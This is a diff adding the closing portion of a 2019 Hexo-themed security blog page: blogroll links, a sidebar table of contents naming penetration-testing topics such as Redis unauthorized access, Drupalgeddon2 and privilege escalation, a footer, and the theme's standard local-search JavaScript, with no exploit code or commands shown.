+                  <li class="links-of-blogroll-item">
+                    <a href="https://gh0st.cn/" title="gh0st" target="_blank">gh0st</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://quyunjie.cn/" title="quyunjie" target="_blank">quyunjie</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chybeta.github.io/" title="chybeta" target="_blank">chybeta</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://rcoil.me/" title="Rcoll" target="_blank">Rcoll</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://yulige.top/" title="郁离歌" target="_blank">郁离歌</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MongoDB未授权访问"><span class="nav-number">2.</span> <span class="nav-text">MongoDB未授权访问</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#服务端SSTI"><span class="nav-number">3.</span> <span class="nav-text">服务端SSTI</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Drupalgeddon2一键GetShell"><span class="nav-number">4.</span> <span class="nav-text">Drupalgeddon2一键GetShell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lotus-RCE"><span class="nav-number">5.</span> <span class="nav-text">Lotus RCE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSH弱密码"><span class="nav-number">6.</span> <span class="nav-text">SSH弱密码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PostgreSQL任意文件读取与写入"><span class="nav-number">7.</span> <span class="nav-text">PostgreSQL任意文件读取与写入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Redis未授权访问"><span class="nav-number">8.</span> <span class="nav-text">Redis未授权访问</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CUPS远程打印服务GetShell-amp-提权"><span class="nav-number">9.</span> <span class="nav-text">CUPS远程打印服务GetShell&amp;提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tomcat后台文件上传"><span class="nav-number">10.</span> <span class="nav-text">Tomcat后台文件上传</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Struts2多处漏洞"><span class="nav-number">11.</span> <span class="nav-text">Struts2多处漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#提权"><span class="nav-number">12.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#提权方法一：SUID提权"><span class="nav-number">12.1.</span> <span class="nav-text">提权方法一：SUID提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权方法二：Crontab提权"><span class="nav-number">12.2.</span> <span class="nav-text">提权方法二：Crontab提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权方法三：内核提权"><span class="nav-number">12.3.</span> <span class="nav-text">提权方法三：内核提权</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">p1n3</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
